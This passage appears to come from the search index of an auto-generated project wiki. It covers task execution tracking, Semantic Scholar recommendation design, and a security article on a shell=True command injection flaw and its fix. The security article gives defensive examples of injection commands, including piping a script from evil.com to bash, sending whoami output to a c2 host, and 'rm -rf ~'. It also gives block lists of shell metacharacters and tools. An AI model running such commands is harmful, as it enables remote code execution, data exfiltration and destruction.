tasks, documents, gameplans, chain outputs</p> <p>Execution Tracking: - Three-layer architecture: tasks (semantics), executions (processes), task_executions (joins) - <code>execution_id</code> links tasks to runtime logs, costs, tokens - Separate status tracking: tasks (work state), executions (runtime state)</p> <p>Dependency Management: - DAG-based dependencies via <code>task_deps</code> table - Cycle detection prevents invalid dependency graphs - Ready task query excludes blocked tasks automatically - Chain tasks create linear pipelines with automatic dependencies</p> <p>Key Pattern: Tasks bridge semantic work tracking (prompts, dependencies, blocking) with runtime execution tracking (logs, PIDs, exit codes). The <code>execution_id</code> field links these two layers, enabling EMDX to track \"what to do\" separately from \"how it's being done.\"</p> <p>Generated from 20 source documents</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/","title":"Semantic Scholar: Radical Scope Limitation and Recommendation Graph","text":""},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#overview","title":"Overview","text":"<p>Semantic Scholar's recommendation system and Connected Papers' graph visualization approach demonstrate how radical scope limitation \u2014 aggressive filtering that shows only 15-25 items instead of hundreds \u2014 creates more useful knowledge exploration tools than comprehensive displays. This pattern applies both to document recommendations (finding related papers) and graph visualizations (showing relationships).</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#key-concepts","title":"Key Concepts","text":""},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#similarity-vs-citation-relationships","title":"Similarity vs. Citation Relationships","text":"<p>Connected Papers builds similarity graphs, not citation trees. Two complementary bibliometric signals determine similarity:</p> <ul> <li> <p>Co-citation analysis: Papers frequently cited together by third parties indicate topical similarity. If papers A and B repeatedly appear in the same reference lists, the research community considers them related. This is a third-party signal independent of whether A cites B directly.</p> </li> <li> <p>Bibliographic coupling: Papers citing many of the same references likely share intellectual foundations. If papers A and B both cite papers X, Y, and Z, they draw from common source material.</p> </li> </ul> <p>Combined, these metrics capture both \"what the community groups together\" (co-citation) and \"what shares foundations\" (bibliographic coupling). Research shows bibliographic coupling slightly outperforms co-citation for accuracy, but the combination proves more robust.</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#the-25-node-limit","title":"The 25-Node Limit","text":"<p>Connected Papers scans ~50,000 papers but displays only the top ~25 most similar to a seed paper. This represents 99.95% exclusion \u2014 a deliberate design choice driven by graph visualization research showing readability collapses above 30 nodes. Below this threshold, node-link diagrams work well. Above it, \"hairball\" effects dominate and matrix-based visualizations actually outperform graphs on most tasks.</p> <p>This extreme filtering prioritizes comprehension over completeness. Users can understand the graph in seconds without instructions.</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#multi-view-architecture","title":"Multi-View Architecture","text":"<p>Rather than cramming everything into one visualization, Connected Papers splits exploration into three separate views:</p> <ol> <li>Main graph: ~25 most similar papers (the \"neighborhood\")</li> <li>Prior Works: Papers frequently cited by graph papers (foundational/seminal works)  </li> <li>Derivative Works: Papers citing many graph papers (surveys/reviews/recent applications)</li> </ol> <p>This separation prevents temporal mixing and gives each view a clear purpose. The main graph shows the core cluster, while Prior/Derivative views enable exploration backward (foundations) or forward (impact) without cluttering the primary visualization.</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#visual-encoding-triple-channel","title":"Visual Encoding (Triple-Channel)","text":"<p>Connected Papers encodes three dimensions simultaneously without requiring legends or labels:</p> Visual Property Meaning Effect Node size Citation count Larger = more influential Color darkness Publication year Darker = more recent Position Similarity to other papers Closer = more related <p>The seed paper receives a distinctive purple circle marker. This triple encoding enables users to instantly identify \"big dark nodes near center\" as recent, influential, closely-related work. Using a continuous color gradient for year avoids discrete-category problems and creates natural visual bands showing temporal clusters.</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#force-directed-layout-properties","title":"Force-Directed Layout Properties","text":"<p>The force-directed algorithm simulates attractive forces between similar papers (spring-like edges) and repulsive forces between all papers (electrostatic-like), iterating until equilibrium where proximity equals similarity. This naturally creates:</p> <ul> <li>Clusters of topically related papers</li> <li>Bridge papers positioned between clusters (interdisciplinary work)  </li> <li>Outliers pushed to periphery (tangentially related)</li> <li>Visual hierarchy through spatial density</li> </ul>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#semantic-scholars-multi-signal-recommendations","title":"Semantic Scholar's Multi-Signal Recommendations","text":"<p>Semantic Scholar's Academic Graph (S2AG) contains 225M+ papers, 2.8B citation edges, and 105M authors. Its recommendation system combines four complementary signals:</p> <p>SPECTER2 embeddings (primary signal): SciBERT-initialized transformer trained with citation-informed contrastive learning using triplet loss on 6M training triplets across 23 fields. Takes title + abstract as input, produces 768-dim embedding vector. Task-specific adapters (linear modules per transformer layer) enable specialization for classification, regression, proximity/retrieval, and ad-hoc search while keeping the base transformer frozen.</p> <p>Citation graph signals: - Direct citation (papers that cite or are cited by the target) - Co-citation (papers frequently cited together) - Bibliographic coupling (papers sharing many references)</p> <p>Personalized research feeds: Three-step process using two linear SVMs trained on TF-IDF and SPECTER embeddings of user-annotated papers, FAISS approximate k-NN search within ~1M recently published papers, and candidate ranking by averaged model scores. User signals include library folder saves (positive), \"not relevant\" ratings (negative), and \"More/Less Like This\" ratings.</p> <p>Search ranking: Elasticsearch with LightGBM reranking emphasizing title matches and citation counts.</p> <p>The combination outperforms any single signal. Multi-signal approaches beat single-signal approaches consistently across both summarization quality and recommendation relevance.</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#tldr-summarization-catts-strategy","title":"TLDR Summarization: CATTS Strategy","text":"<p>Semantic Scholar generates single-sentence summaries (~20 words) from 200-word abstracts using BART-large (Bidirectional and Auto-Regressive Transformer) with the CATTS training innovation:</p> <p>CATTS (Controllable Abstractive TLDR with Title Scaffolding) addresses limited annotated data (only 5.4K TLDR examples) by shuffling the training data with 20K paper-title pairs from arXiv. Each source document gets prepended with a control code: <code>|TLDR|</code> for summary generation or <code>|TITLE|</code> for title generation.</p> <p>Title generation acts as a scaffold task. Since titles naturally distill the single most important aspect of a paper, learning to generate titles transfers directly to generating useful TLDRs. This multi-task approach outperformed all single-task baselines on both automated metrics and human evaluation.</p> <p>The extreme 10:1 compression ratio forces the model to make judgment calls \u2014 there's no room for filler or generic language. This produces more useful summaries than moderate compression approaches.</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#connected-papers-graph-construction","title":"Connected Papers Graph Construction","text":"<pre><code>def build_similarity_graph(seed_paper_id):\n    # Scan corpus of ~50,000 papers from Semantic Scholar\n    candidates = semantic_scholar.get_papers(sample_size=50000)\n\n    # Compute pairwise similarity using co-citation + bibliographic coupling\n    similarities = []\n    for paper in candidates:\n        score = (\n            co_citation_score(seed_paper_id, paper.id) +\n            bibliographic_coupling_score(seed_paper_id, paper.id)\n        )\n        similarities.append((paper, score))\n\n    # Select top ~25 most similar papers\n    top_papers = sorted(similarities, key=lambda x: x[1], reverse=True)[:25]\n\n    # Apply force-directed layout\n    graph = create_force_directed_layout(\n        nodes=top_papers,\n        attractive_force=similarity_springs,\n        repulsive_force=electrostatic_repulsion\n    )\n\n    return graph\n</code></pre>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#idf-weighted-shared-link-similarity","title":"IDF-Weighted Shared-Link Similarity","text":"<p>For knowledge base applications, IDF-weighting (inverse document frequency) makes shared links more meaningful:</p> <pre><code>def idf_weighted_similarity(doc_a, doc_b, corpus):\n    shared_links = set(doc_a.links) &amp; set(doc_b.links)\n\n    score = 0\n    for link in shared_links:\n        # Rare shared links contribute more than common ones\n        idf = log(len(corpus) / count_documents_linking_to(link))\n        score += idf\n\n    return score\n</code></pre> <p>Obscure shared links matter more than popular ones. Two documents both linking to a rarely-referenced source indicate stronger topical similarity than both linking to a frequently-cited foundation.</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#semantic-scholar-api-access","title":"Semantic Scholar API Access","text":"<p>Three API services provide programmatic access:</p> <p>Academic Graph API (<code>/graph/v1/</code>):</p> <pre><code># Paper search with TLDR field\nGET /paper/search/bulk?query=...&amp;fields=title,tldr,abstract,year\n\n# Paper details including embedding\nGET /paper/{paper_id}?fields=title,abstract,tldr,embedding.specter_v2\n\n# Citations and references\nGET /paper/{id}/citations\nGET /paper/{id}/references\n</code></pre> <p>Recommendations API (<code>/recommendations/v1/</code>):</p> <pre><code># Single paper recommendations\nGET /recommendations/v1/papers/forpaper/{paper_id}\n\n# Multi-paper with positive/negative signals\nPOST /recommendations/v1/papers/\n{\n  \"positivePaperIds\": [\"id1\", \"id2\"],\n  \"negativePaperIds\": [\"id3\"]\n}\n</code></pre> <p>Authentication via <code>x-api-key</code> header. Unauthenticated requests share a 1000 req/s pool; API keys get dedicated 1 req/s.</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#graph-visualization-tool-comparison","title":"Graph Visualization Tool Comparison","text":"Tool Layout Scope Key Insight Connected Papers Force-directed, unstructured ~25 papers Radical simplification \u2014 99.95% filtered out Litmaps Coordinate-based (date \u00d7 citations) 10 papers per batch Structured axes provide instant orientation ResearchRabbit Coordinate-based + AI recommendations Highly-connected subset Search breadcrumbing prevents disorientation Inciteful No visualization \u2014 ranked lists only 10K-20K papers analyzed PageRank + Adamic/Adar lists can beat graphs <p>Litmaps discovered that structured axes (x = date, y = citation count) give users immediate spatial orientation that pure force-directed layouts lack. ResearchRabbit's \"rabbit hole\" metaphor saves every search iteration, enabling backtracking \u2014 recognizing that exploration process matters as much as results. Inciteful proves visualization isn't always necessary: ranked lists with good scoring (PageRank, Adamic/Adar link prediction) can be more actionable than pretty graphs.</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#ux-patterns-for-document-relationships","title":"UX Patterns for Document Relationships","text":"<p>Progressive disclosure: Start simple, reveal detail on demand. Hover shows summary, click shows full detail, dedicated buttons for related views.</p> <p>Triple visual encoding: Encode three dimensions simultaneously (size, color, position) to maximize information density without clutter.</p> <p>Intelligent density management: - Hard cap at 25-30 nodes for force-directed layouts - Use community detection to group related items - Provide combos/super-nodes for zoom operations - Filter by user's current question, not arbitrary metrics</p> <p>Analytical fallback: Always offer ranked lists alongside graph visualizations. Some tasks are better served by sortable tables than spatial layouts.</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#related-topics","title":"Related Topics","text":""},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#application-to-knowledge-base-wiki-generation","title":"Application to Knowledge Base Wiki Generation","text":"<p>Direct parallels between academic tool concepts and knowledge base equivalents:</p> Academic Tool Knowledge Base Equivalent Co-citation Documents linked together by other documents (shared backlinks) Bibliographic coupling Documents linking to same sources Citation count \u2192 node size Access count or link count \u2192 node size Publication year \u2192 color Creation/modification date \u2192 color Seed paper \u2192 graph Seed document \u2192 graph TLDR from title+abstract Summary from title + first N sentences SPECTER embeddings Document embeddings for similarity"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#key-technical-insights-for-auto-wiki-summaries","title":"Key Technical Insights for Auto-Wiki Summaries","text":"<p>Extreme compression works: 10:1 compression produces more useful summaries than moderate compression. For knowledge base documents, target 1-2 sentence summaries, not paragraphs.</p> <p>Title generation transfers to summarization: Training on document titles as auxiliary data is cheap and effective. The CATTS approach shows auxiliary tasks improve primary tasks when well-chosen.</p> <p>Embedding-based similarity is foundational: SPECTER2's citation-informed embeddings outperform pure text similarity. For knowledge bases, link/reference relationships (when available) similarly improve document similarity over text-only approaches.</p> <p>Multi-signal recommendations beat single-signal: Combining embeddings + graph signals + user feedback produces better recommendations than any component alone. For knowledge bases: combine text similarity + tag overlap + link graph + access patterns.</p> <p>Fixed models, not online learning for summaries: Semantic Scholar doesn't use feedback to improve individual TLDRs. For wiki generation, batch re-generation (periodic model updates) may be more practical than continuous improvement.</p> <p>Control codes enable multi-task generation: The <code>|TLDR|</code> / <code>|TITLE|</code> prefix pattern enables single models to produce multiple output types, allowing one model to serve different use cases.</p>"},{"location":"articles/semantic-scholar-radical-scope-limitation-and-recommendation-graph/#managing-graph-density","title":"Managing Graph Density","text":"<p>Graph visualizations hit a readability cliff at ~30 nodes. Below this threshold, node-link diagrams work well. Above it, research shows matrix-based visualizations outperform node-link diagrams on most tasks except path-finding.</p> <p>Alternative strategies for contexts requiring more nodes:</p> <p>Hierarchical community detection: Partition graphs into interpretable subnetworks. Research suggests communities should not exceed 25 subcommunities to remain interpretable.</p> <p>Level-of-detail rendering: Use heatmaps or density plots at zoomed-out levels, individual nodes when zoomed in.</p> <p>Combos/grouping: Collapse clusters into single \"super-nodes\" expandable on demand.</p> <p>Intelligent filtering: Match visualization scope to the user's current question rather than showing everything.</p> <p>The \"hairball / snowstorm / starburst\" taxonomy identifies common problems: - Hairballs (too many connections): filter, cluster, or apply community detection - Snowstorms (too sparse/disconnected): enrich data or adjust similarity thresholds - Starbursts (one node dominates): limit expansion depth or regroup</p> <p>Generated from 9 source documents</p>"},{"location":"articles/shlexsplit-shelltrue-and-each/","title":"shlex.split(): shell=True and --each","text":""},{"location":"articles/shlexsplit-shelltrue-and-each/#overview","title":"Overview","text":"<p>The <code>emdx delegate --each</code> feature was designed to enable discovery-driven delegation: run a shell command to find files, then delegate a task for each result. This pattern introduced a critical command injection vulnerability that was identified in security audit #6230 and subsequently fixed across multiple iterations in PRs #483-#513. The feature was ultimately removed entirely in a later security review.</p>"},{"location":"articles/shlexsplit-shelltrue-and-each/#the-vulnerability","title":"The Vulnerability","text":"<p>The original implementation passed user input directly to <code>subprocess.run()</code> with <code>shell=True</code>:</p> <pre><code># VULNERABLE CODE (removed)\ndef _run_discovery(command: str) -&gt; List[str]:\n    result = subprocess.run(\n        command,\n        shell=True,  # CRITICAL FLAW: enables arbitrary command execution\n        capture_output=True,\n        text=True,\n        timeout=30,\n    )\n    return result.stdout.splitlines()\n</code></pre> <p>This design allowed trivial command injection through shell metacharacters:</p> <pre><code># Attack examples\nemdx delegate --each \"; rm -rf ~\" --do \"Review {{item}}\"\nemdx delegate --each \"fd | curl http://evil.com/exfil.sh | bash\" --do \"task\"\nemdx delegate --each \"$(whoami)\" --do \"task\"\nemdx delegate --each \"ls &amp;&amp; curl http://c2.server?data=$(whoami)\" --do \"task\"\n</code></pre> <p>The vulnerability was classified as HIGH/CRITICAL severity because it: - Accepted completely untrusted user input - Executed with the user's full shell privileges - Required no special permissions to exploit - Could execute arbitrary commands including destructive operations</p>"},{"location":"articles/shlexsplit-shelltrue-and-each/#why-shelltrue-is-dangerous","title":"Why shell=True Is Dangerous","text":"<p>When <code>shell=True</code> is used, Python invokes a shell (e.g., <code>/bin/sh</code>) to execute the command string. The shell interprets metacharacters like <code>;</code>, <code>|</code>, <code>&amp;</code>, backticks, <code>$()</code>, enabling command chaining, piping, and substitution. This is convenient but catastrophic when the command string contains untrusted user input.</p> <p>Example attack:</p> <pre><code># Attacker provides: \"; cat /etc/passwd\"\ncommand = user_input  # \"; cat /etc/passwd\"\nsubprocess.run(command, shell=True)\n# Shell executes: sh -c \"; cat /etc/passwd\"\n# Result: /etc/passwd is dumped\n</code></pre> <p>With <code>shell=False</code>, the same input would attempt to execute a binary literally named <code>\"; cat /etc/passwd\"</code>, which doesn't exist\u2014the attack fails.</p>"},{"location":"articles/shlexsplit-shelltrue-and-each/#the-fix-defense-in-depth","title":"The Fix: Defense in Depth","text":"<p>Multiple security patches implemented a three-layer defense strategy:</p>"},{"location":"articles/shlexsplit-shelltrue-and-each/#layer-1-command-allowlist","title":"Layer 1: Command Allowlist","text":"<p>A frozen set defined the only permitted discovery tools:</p> <pre><code>SAFE_DISCOVERY_COMMANDS = frozenset({\n    'fd', 'find', 'git', 'rg', 'grep', 'ls', 'eza', 'exa',\n    'tree', 'locate', 'ag', 'mdfind', 'cat', 'head', 'tail',\n    'sort', 'uniq', 'wc', 'echo', 'printf', 'jq', 'emdx'\n})\n</code></pre> <p>Explicitly blocked: <code>rm</code>, <code>mv</code>, <code>cp</code>, <code>chmod</code>, <code>bash</code>, <code>sh</code>, <code>python</code>, <code>curl</code>, <code>wget</code>, <code>nc</code>, <code>sudo</code>\u2014any command that could modify system state or execute arbitrary code.</p> <p>Git special handling: Git commands received additional validation since <code>git</code> was allowlisted but has dangerous subcommands:</p> <pre><code>if base_command == \"git\":\n    if len(args) &lt; 2:\n        raise ValueError(\"git requires a subcommand\")\n\n    safe_git_subcommands = {\"ls-files\", \"diff\", \"log\", \"show\", \"branch\"}\n    if args[1] not in safe_git_subcommands:\n        raise ValueError(f\"git {args[1]} not allowed\")\n</code></pre> <p>Allowed: <code>ls-files</code>, <code>diff</code>, <code>log</code>, <code>show</code>, <code>branch</code> Blocked: <code>checkout</code>, <code>reset</code>, <code>clean</code>, <code>push</code>, <code>remote</code>, <code>clone</code></p>"},{"location":"articles/shlexsplit-shelltrue-and-each/#layer-2-shell-metacharacter-blocking","title":"Layer 2: Shell Metacharacter Blocking","text":"<p>Before parsing, the raw command string was checked for dangerous shell operators:</p> <pre><code>DANGEROUS_PATTERNS = [\";\", \"&amp;\", \"|\", \"`\", \"$(\", \"${\", \"||\", \"&amp;&amp;\", \"&gt;\", \"&lt;\"]\n\nfor pattern in DANGEROUS_PATTERNS:\n    if pattern in command:\n        raise ValueError(\n            f\"Command contains dangerous pattern '{pattern}'. \"\n            f\"--each only allows simple file discovery commands.\"\n        )\n</code></pre> <p>This blocked command chaining, command substitution, variable expansion, and redirects. Even if validation were somehow bypassed, this provided defense-in-depth.</p>"},{"location":"articles/shlexsplit-shelltrue-and-each/#layer-3-safe-parsing-with-shlexsplit-and-shellfalse","title":"Layer 3: Safe Parsing with shlex.split() and shell=False","text":"<p>Commands were parsed into argument lists and executed without shell interpretation:</p> <pre><code># SECURE CODE\ndef _validate_discovery_command(command: str) -&gt; List[str]:\n    \"\"\"Parse and validate discovery command. Returns argv list for safe execution.\"\"\"\n    # Check for shell metacharacters\n    if re.search(r'[;&amp;|`$(){}[\\]&lt;&gt;!\\n\\r]', command):\n        raise ValueError(\"Command contains unsafe shell metacharacters\")\n\n    # Parse with shlex.split() - handles quoted arguments correctly\n    try:\n        args = shlex.split(command)\n    except ValueError as e:\n        raise ValueError(f\"Failed to parse command: {e}\") from e\n\n    if not args:\n        raise ValueError(\"Empty command\")\n\n    # Extract base command (handle absolute paths like /usr/bin/fd)\n    base_command = os.path.basename(args[0])\n\n    if base_command not in SAFE_DISCOVERY_COMMANDS:\n        raise ValueError(\n            f\"Command '{base_command}' not in allowlist. \"\n            f\"Allowed: {sorted(SAFE_DISCOVERY_COMMANDS)}\"\n        )\n\n    return args\n\ndef _run_discovery(command: str) -&gt; List[str]:\n    args = _validate_discovery_command(command)\n    result = subprocess.run(\n        args,  # Pass as list, not string\n        shell=False,  # CRITICAL: No shell interpretation\n        capture_output=True,\n        text=True,\n        timeout=30,\n    )\n    return result.stdout.splitlines()\n</code></pre> <p>Why shlex.split() matters:</p> <p><code>shlex.split()</code> correctly parses shell-like quoting without executing anything:</p> <pre><code>shlex.split('fd -e \"py files\"')\n# Returns: ['fd', '-e', 'py files']\n\nshlex.split(\"fd; rm -rf ~\")\n# Returns: ['fd;', 'rm', '-rf', '~']\n# The ';' becomes a literal argument\n</code></pre> <p>It handles quoted arguments and escaping, preventing argument injection while respecting user intent for legitimate commands.</p> <p>Why shell=False is non-negotiable:</p> <p>When <code>shell=False</code>, Python spawns the target process directly via <code>execve()</code> with no shell intermediary: - No shell metacharacter interpretation (<code>|</code>, <code>;</code>, <code>$()</code>, etc. are literal arguments) - No command chaining, substitution, or globbing - Argument vector passed directly to the OS, bypassing bash/sh/zsh entirely</p> <p>The combination of argument list parsing + <code>shell=False</code> makes command injection impossible at the subprocess layer.</p>"},{"location":"articles/shlexsplit-shelltrue-and-each/#escape-hatch-allow-shell","title":"Escape Hatch: --allow-shell","text":"<p>Some implementations added an explicit opt-in flag for legitimate use cases requiring shell features:</p> <pre><code>if allow_shell:\n    # Display prominent warning\n    console.print(\"[yellow]\u26a0\ufe0f  WARNING: Shell execution enabled[/yellow]\")\n    result = subprocess.run(command, shell=True, ...)\nelse:\n    # Secure path\n    args = _validate_discovery_command(command)\n    result = subprocess.run(args, shell=False, ...)\n</code></pre> <p>The <code>--allow-shell</code> flag: - Required explicit user consent for each invocation - Displayed a visible warning when used - Should be avoided in automated/scripted contexts - Preserved functionality for power users who understood the risks</p>"},{"location":"articles/shlexsplit-shelltrue-and-each/#test-coverage","title":"Test Coverage","text":"<p>The security fix included 30-50+ comprehensive tests across implementations:</p> <p>Safe commands (8-12 tests): - <code>fd -e py</code> - <code>find . -name \"*.py\"</code> - <code>git ls-files</code> - <code>git diff --name-only</code> - <code>rg -l pattern</code> - <code>ls -1 src/</code> - <code>/usr/bin/fd</code> (full path)</p> <p>Blocked dangerous commands (6-12 tests): - <code>rm -rf /</code> - <code>bash -c 'evil'</code> - <code>curl http://evil</code> - <code>python -c 'malicious'</code> - <code>chmod 777 /</code></p> <p>Injection patterns (14-20 tests): - <code>fd; rm -rf ~</code> (semicolon chaining) - <code>fd | xargs rm</code> (pipe injection) - <code>fd &amp;&amp; evil</code> (command chaining) - <code>fd <code>malicious</code></code> (backtick substitution) - <code>fd $(evil)</code> (command substitution) - <code>fd &gt; /etc/passwd</code> (redirect)</p> <p>Edge cases: - Empty commands - Whitespace-only commands - Quoted arguments: <code>find . -name \"my file.py\"</code> - Malformed syntax (unclosed quotes)</p> <p>All project tests passed after the fix (800-1200+ tests depending on implementation iteration).</p>"},{"location":"articles/shlexsplit-shelltrue-and-each/#breaking-changes","title":"Breaking Changes","text":"<p>The security fix intentionally broke shell operator support:</p> <p>Before (no longer works):</p> <pre><code>emdx delegate --each \"git branch -r | grep feature\" --do \"analyze branch\"\nemdx delegate --each \"fd -e py | head -5\" --do \"check file\"\n</code></pre> <p>After (use command-specific flags):</p> <pre><code>emdx delegate --each \"git branch -r --list *feature*\" --do \"analyze branch\"\nemdx delegate --each \"fd -e py --max-results 5\" --do \"check file\"\n</code></pre> <p>Or use escape hatch (if implemented):</p> <pre><code>emdx delegate --allow-shell --each \"fd | custom-filter\" --do \"task\"\n# \u26a0\ufe0f  WARNING: Shell execution enabled\n</code></pre>"},{"location":"articles/shlexsplit-shelltrue-and-each/#ultimate-resolution-feature-removal","title":"Ultimate Resolution: Feature Removal","text":"<p>After implementing the comprehensive security fix, the EMDX team made a strategic decision to remove <code>--each/--do</code> entirely. The feature was never actively used, and maintaining a secure implementation of dynamic shell command execution required ongoing vigilance against new attack vectors.</p> <p>The removal simplified the codebase: - Deleted <code>SAFE_DISCOVERY_COMMANDS</code>, <code>_validate_discovery_command()</code>, <code>_run_discovery()</code> - Removed <code>--each</code>/<code>--do</code> CLI options - Deleted security test suite (6+ test classes) - Updated documentation across <code>CLAUDE.md</code>, <code>README.md</code>, <code>docs/cli-api.md</code></p> <p>This follows the principle of eliminating attack surface rather than hardening it\u2014if a feature introduces security risks disproportionate to its value, deletion is the correct fix.</p>"},{"location":"articles/shlexsplit-shelltrue-and-each/#secure-subprocess-patterns","title":"Secure Subprocess Patterns","text":""},{"location":"articles/shlexsplit-shelltrue-and-each/#when-to-use-shelltrue-vs-shellfalse","title":"When to Use shell=True vs shell=False","text":"Use Case Correct Approach Example User-controlled input <code>shell=False</code> + <code>shlex.split()</code> <code>subprocess.run(shlex.split(user_cmd), shell=False)</code> Hardcoded command <code>shell=False</code> with list <code>subprocess.run([\"ls\", \"-l\"], shell=False)</code> Shell features needed Avoid user input, or use <code>shlex.quote()</code> <code>subprocess.run(f\"find . -name {shlex.quote(pattern)}\", shell=True)</code> Trusted developer input <code>shell=True</code> acceptable <code>subprocess.run(\"cd /tmp &amp;&amp; rm *.log\", shell=True)</code> <p>Golden rule: Never combine <code>shell=True</code> with user-controlled input.</p>"},{"location":"articles/shlexsplit-shelltrue-and-each/#always-safe-pattern","title":"Always Safe Pattern","text":"<pre><code>import subprocess, shlex\n\n# Parse user input safely\nargs = shlex.split(user_input)\n\n# Validate command against allowlist\nbase_cmd = os.path.basename(args[0])\nif base_cmd not in ALLOWED_COMMANDS:\n    raise ValueError(\"Forbidden command\")\n\n# Execute without shell\nsubprocess.run(args, shell=False, capture_output=True, text=True)\n</code></pre>"},{"location":"articles/shlexsplit-shelltrue-and-each/#never-safe-pattern","title":"Never Safe Pattern","text":"<pre><code># DANGEROUS: User input + shell=True\nsubprocess.run(user_input, shell=True)\n\n# DANGEROUS: String formatting into shell commands\nsubprocess.run(f\"ls {user_path}\", shell=True)\n\n# DANGEROUS: Even if you try to escape/sanitize\nsubprocess.run(f\"grep '{escaped_pattern}' file\", shell=True)\n</code></pre>"},{"location":"articles/shlexsplit-shelltrue-and-each/#security-principles-applied","title":"Security Principles Applied","text":"<p>This fix demonstrates several security best practices:</p> <ol> <li>Principle of Least Privilege: Allowlist only necessary commands, deny everything else</li> <li>Defense in Depth: Multiple validation layers (allowlist + metacharacter blocking + shell=False)</li> <li>Secure by Default: Safe behavior is default; unsafe behavior requires explicit opt-in</li> <li>Fail Securely: Invalid commands raise exceptions rather than executing with degraded validation</li> <li>Clear Security Boundaries: <code>--allow-shell</code> flag makes the security boundary explicit</li> <li>Eliminate Attack Surface: When hardening proves complex, remove the feature entirely</li> </ol>"},{"location":"articles/shlexsplit-shelltrue-and-each/#related-security-findings","title":"Related Security Findings","text":"<p>The broader security audit (#6230) identified other issues:</p> Finding Severity Status Command injection in --each HIGH/CRITICAL \u2705 FIXED (feature removed) Dynamic SQL in migrations MEDIUM Acceptable (hardcoded column names) Dynamic SQL in group updates MEDIUM Acceptable (allowlist validated) Path traversal in file save LOW By design for CLI tool Unsafe pickle deserialization MEDIUM Open (recommendation: migrate to safetensors) <p>Overall security posture: The critical command injection vulnerability was eliminated. SQL injection well-protected via parameterized queries. Credential handling follows best practices (no hardcoded secrets, environment variables for API keys).</p> <p>Generated from 29 source documents</p>"},{"location":"entities/actionable-items/","title":"actionable items","text":"<p>Type: heading | Mentioned in: 23 documents | First seen: 2025-07-07</p>"},{"location":"entities/actionable-items/#documents-23","title":"Documents (23)","text":"<ul> <li>#6874 Delegate synthesis [synthesis] <p>Test-only production code \u2014 <code>models/executions.py</code> and <code>models/tags.py</code> have functions called only from tests, not from any production path. ### Actionable Items</p> </li> </ul> <p>Immediate cleanup (safe, no behavior change):</p> <ol> <li> <p>Delete 3 entire files in ...</p> </li> <li> <p>#6670 Prime Command Redesign Research [synthesis]</p> <p>Drop command cheatsheet and RULES (already in CLAUDE.md) | | Delegate | <code>EMDX_AUTO_SAVE=1</code> | 3 lines: role reminder, auto-save notice, explicit \"Do NOT check ready tasks\" | | Delegate + doc | <code>EMDX_AUTO_SAVE=1</code> + <code>EMDX_DOC_ID</code> set | Same ...</p> </li> <li> <p>#6611 Emoji alias removal: synthesis</p> <p>Update display \u2014 Rewrite <code>formatting.py</code> tag ordering to use text names</p> </li> <li>Update docs/tests \u2014 CLAUDE.md, architecture docs, test assertions</li> </ol>"},{"location":"entities/actionable-items/#actionable-items_1","title":"Actionable Items","text":"<ol> <li> <p>Write migration <code>migration_029_convert_emoji_tags_to_text</code> with canonical em...</p> </li> <li> <p>#6574 Delegate synthesis [synthesis]</p> <p>Clear Separation of Concerns: Commands handle CLI parsing and user interaction; services handle business logic and external integrations. ## Actionable Items</p> </li> <li> <p>When adding new features: Start at the command layer, delegate to services</p> </li> <li> <p>**Wh...</p> </li> <li> <p>#6571 Delegate synthesis [synthesis]</p> <p>Dead code: Unreachable duplicate <code>return doc_ids</code> at line 861 of <code>delegate.py</code></p> </li> <li>Theoretical edge case: Agent could save with unrecognized doc ID format, triggering fallback duplicate (unlikely with current comprehensive patterns)</li> </ol>"},{"location":"entities/actionable-items/#action","title":"Action...","text":"<ul> <li>#6567 Delegate synthesis [synthesis] <p>Synthesis (if enabled) prints only the combined summary</p> </li> </ul>"},{"location":"entities/actionable-items/#5-git-integration","title":"5. Git Integration","text":"<ul> <li><code>--worktree</code>: Isolated execution environment</li> <li><code>--branch</code>: Push branch without PR (worktree retained)</li> <li><code>--pr</code>: Create PR after changes (worktree cleaned up)</li> <li> <p>`--draf...</p> </li> <li> <p>#6531 Delegate synthesis [synthesis]</p> <p>Graceful Degradation: #650 falls back to keyword search when embeddings aren't available; #652 maintains backwards compatibility with simple recipes. ### Quality Assessment Summary</p> </li> </ul> <p>| PR | Quality | Test Coverage | Critical Issues | |----|-------...</p> <ul> <li>#6521 Delegate synthesis [synthesis] <p>Context Budget Optimization</p> </li> <li>Relative Time Formatting</li> </ul>"},{"location":"entities/actionable-items/#files-to-modify","title":"Files to Modify","text":"File Changes <code>emdx/commands/prime.py</code> Add <code>_get_git_context()</code>, <code>_get_key_docs()</code>, relative time <code>emdx/commands/ask.py</code> Add <code>--tags</code>,... <ul> <li>#6511 None Type Analysis [synthesis] <p>State tracking \u2014 \"no selection\", \"not yet completed\"</p> </li> <li>Dataclass optional fields \u2014 pr_url, error_message, exit_code</li> </ul>"},{"location":"entities/actionable-items/#typer-specific-pattern","title":"Typer-Specific Pattern","text":"<p>For Typer CLI commands with optional parameters: ```python</p>"},{"location":"entities/actionable-items/#correct-annotation-matches-runtim","title":"CORRECT - annotation matches runtim...","text":"<ul> <li>#6455 Delegate Synthesis Test Results [synthesis] <p>Identical responses \u2014 Both agents appropriately asked for clarification rather than guessing at intent</p> </li> <li>Test run detected \u2014 Task 2's note explicitly identifies this 